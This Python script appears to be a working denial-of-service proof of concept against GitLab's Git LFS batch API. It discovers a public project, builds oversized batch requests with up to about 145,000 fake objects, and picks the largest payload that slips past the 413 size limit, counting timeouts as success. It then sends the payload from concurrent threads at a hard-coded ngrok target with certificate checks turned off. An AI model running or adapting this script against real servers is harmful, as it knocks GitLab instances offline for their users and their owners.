import json
import subprocess
import threading
import time
import argparse
from pathlib import Path
from datetime import datetime

# Mapping of file names to object counts
FILE_NAME_TO_COUNT = {
    "lfs_payload_1mb.json": 45199,    # ~1MB
    "lfs_payload_3mb.json": 144999   # ~3MB
}

# Configuration
DEFAULT_DOMAIN = "https://c40b-88-222-161-135.ngrok-free.app"
DEFAULT_PAYLOAD = "lfs_payload_3mb.json"
NUM_THREADS = 7
DELAY_SECONDS = 1  # Delay between thread starts

def print_verbose(message, thread_num=None):
    """Helper function for consistent verbose output"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    thread_prefix = f"Thread {thread_num} - " if thread_num is not None else ""
    print(f"[{timestamp}] {thread_prefix}{message}")

def generate_lfs_objects(n):
    """Generate n LFS objects with sequential OIDs"""
    return [
        {
            "oid": 1,  # Sequential fake SHA256
            "size": 1
        }
        for i in range(n)
    ]

def create_payload_file(file_name):
    """Create a payload file with the specified name"""
    num_objects = FILE_NAME_TO_COUNT[file_name]
    
    batch_request = {
        "operation": "download",
        "transfers": ["basic"],
        "ref": {"name": "refs/heads/main"},
        "objects": generate_lfs_objects(num_objects)
    }
    
    with open(file_name, 'w') as f:
        json.dump(batch_request, f)
    
    print_verbose(f"Created payload file {file_name} with {num_objects:,} objects")
    return file_name

def ensure_payload_exists(file_name):
    """Ensure payload file exists, create it if it doesn't"""
    payload_path = Path(file_name)
    if not payload_path.exists():
        print_verbose(f"Payload file {file_name} not found, creating it...")
        return create_payload_file(file_name)
    
    # Verify it's valid JSON
    try:
        with open(payload_path, 'r') as f:
            json.load(f)
        return file_name
    except json.JSONDecodeError:
        print_verbose(f"Existing payload file {file_name} is invalid, recreating...")
        return create_payload_file(file_name)

def discover_lfs_endpoint(domain):
    """Discover the LFS endpoint by querying public projects"""
    projects_url = f"{domain}/api/v4/projects?visibility=public&simple=true&per_page=1"
    print_verbose(f"Attempting to discover LFS endpoint via {projects_url}")
    
    try:
        curl_cmd = [
            "curl",
            "-X", "GET",
            projects_url,
            "--silent", "--show-error", "--insecure"
        ]
        
        result = subprocess.run(curl_cmd, capture_output=True, text=True, timeout=10)
        
        if result.returncode != 0:
            print_verbose(f"Failed to discover projects: {result.stderr}")
            return None
            
        try:
            projects = json.loads(result.stdout)
            if not projects:
                print_verbose("No public projects found")
                return None
                
            first_project = projects[0]
            path_with_namespace = first_project.get('path_with_namespace')
            if not path_with_namespace:
                print_verbose("Project doesn't have path_with_namespace")
                return None
                
            lfs_endpoint = f"{domain}/{path_with_namespace}.git/info/lfs/objects/batch"
            print_verbose(f"Discovered LFS endpoint: {lfs_endpoint}")
            return lfs_endpoint
            
        except json.JSONDecodeError:
            print_verbose("Invalid JSON response from projects API")
            return None
            
    except Exception as e:
        print_verbose(f"Error discovering LFS endpoint: {str(e)}")
        return None

def send_test_request(payload_file, lfs_endpoint):
    """Send a test request and check for 413 errors in both HTTP code and response text.
    Timeouts are treated as successful cases (payload works)."""
    curl_cmd = [
        "curl",
        "-X", "POST",
        "-H", "Accept: application/vnd.git-lfs+json",
        "-H", "Content-Type: application/vnd.git-lfs+json",
        "--data-binary", f"@{payload_file}",
        lfs_endpoint,
        "--silent", "--show-error", "--insecure",
        "-w", "%{http_code}"
    ]
    
    print_verbose(f"Sending test request with {payload_file}")
    
    try:
        result = subprocess.run(curl_cmd, capture_output=True, text=True, timeout=10)
        
        # Extract HTTP status code (last 3 digits of stdout)
        status_code = result.stdout[-3:]
        body_text = result.stdout[:-3]  # response body (excluding status code)

        is_413_code = status_code == "413"
        is_413_text = "413 Request Entity Too Large" in (body_text + result.stderr)

        if is_413_code or is_413_text:
            print_verbose(f"Payload {payload_file} too large (413 error)")
            return ""
        else:
            print_verbose(f"Payload {payload_file} works (status: {status_code})")
            return payload_file
            
    except subprocess.TimeoutExpired:
        print_verbose(f"Payload {payload_file} works (request timed out)")
        return payload_file
        
    except Exception as e:
        print_verbose(f"Error testing payload {payload_file}: {str(e)}")
        return ""

def find_working_payload(lfs_endpoint):
    """Test payloads from largest to smallest to find one that works"""
    # Test from largest to smallest payload
    for payload in ["lfs_payload_3mb.json", "lfs_payload_1mb.json"]:
        ensure_payload_exists(payload)
        working_payload = send_test_request(payload, lfs_endpoint)
        if working_payload:
            return working_payload
    
    print_verbose("No working payload found - all payloads too large")
    return ""

def send_curl_request(thread_num, payload_file, lfs_endpoint):
    """Function to send cURL request with detailed logging"""
    curl_cmd = [
        "curl",
        "-X", "POST",
        "-H", "Accept: application/vnd.git-lfs+json",
        "-H", "Content-Type: application/vnd.git-lfs+json",
        "--data-binary", f"@{payload_file}",
        lfs_endpoint,
        "--verbose",
        "--show-error",
        "--insecure"
    ]
    
    try:
        print_verbose(f"Starting cURL request", thread_num)
        print_verbose(f"Command: {' '.join(curl_cmd)}", thread_num)
        
        start_time = time.time()
        result = subprocess.run(curl_cmd, capture_output=True, text=True, timeout=30)
        elapsed_time = time.time() - start_time
        
        print_verbose(f"Request completed in {elapsed_time:.2f} seconds", thread_num)
        print_verbose(f"HTTP Status: {result.returncode}", thread_num)
        
        if result.returncode == 0:
            print_verbose("Request successful", thread_num)
            print_verbose(f"Response: {result.stdout[:200]}...", thread_num)
        else:
            print_verbose(f"Request failed with status {result.returncode}", thread_num)
            print_verbose(f"Error output: {result.stderr}", thread_num)
            print_verbose(f"Full output: {result.stdout}", thread_num)
            
    except subprocess.TimeoutExpired:
        print_verbose("Request timed out after 30 seconds", thread_num)
    except Exception as e:
        print_verbose(f"Unexpected error: {str(e)}", thread_num)

def main():
    # Set up argument parser
    parser = argparse.ArgumentParser(description="LFS batch request tester")
    parser.add_argument("--domain", type=str, default=DEFAULT_DOMAIN,
                       help="Domain of the GitLab instance (default: %(default)s)")
    parser.add_argument("--file_name", 
                       choices=FILE_NAME_TO_COUNT.keys(),
                       help="Specific payload file to use (default: auto-detect)")
    parser.add_argument("--threads", type=int, default=NUM_THREADS,
                       help="Number of total threads (default: %(default)d)")
    parser.add_argument("--delay", type=float, default=DELAY_SECONDS,
                       help="Delay between thread starts in seconds (default: %(default).1f)")
    args = parser.parse_args()

    # Discover LFS endpoint
    lfs_endpoint = discover_lfs_endpoint(args.domain)
    if not lfs_endpoint:
        print_verbose("Error: Could not discover LFS endpoint")
        return

    # Determine which payload to use
    if args.file_name:
        payload_file = ensure_payload_exists(args.file_name)
    else:
        print_verbose("No payload specified, auto-detecting working payload...")
        payload_file = find_working_payload(lfs_endpoint)
        if not payload_file:
            print_verbose("Error: Could not find a working payload")
            return

    # Print startup information
    print_verbose("\nStarting LFS batch request script")
    print_verbose(f"Target endpoint: {lfs_endpoint}")
    print_verbose(f"Using payload file: {payload_file}")
    print_verbose(f"Thread count: {args.threads}")
    print_verbose(f"Delay between threads: {args.delay}s")

    print_verbose(f"\nSending {args.threads} requests with {args.delay}s delays...")

    # Create and start threads with delays
    threads = []
    for i in range(args.threads):
        print_verbose(f"Creating thread {i+1}")
        t = threading.Thread(target=send_curl_request, args=(i+1, payload_file, lfs_endpoint))
        t.start()
        threads.append(t)
        
        if i < args.threads - 1:
            print_verbose(f"Waiting {args.delay}s before next thread...")
            time.sleep(args.delay)

    # Wait for all threads to complete
    print_verbose("\nWaiting for all threads to complete...")
    for i, t in enumerate(threads):
        t.join()
        print_verbose(f"Thread {i+1} has completed")

    print_verbose("\nAll requests completed")
    input("")

if __name__ == "__main__":
    main()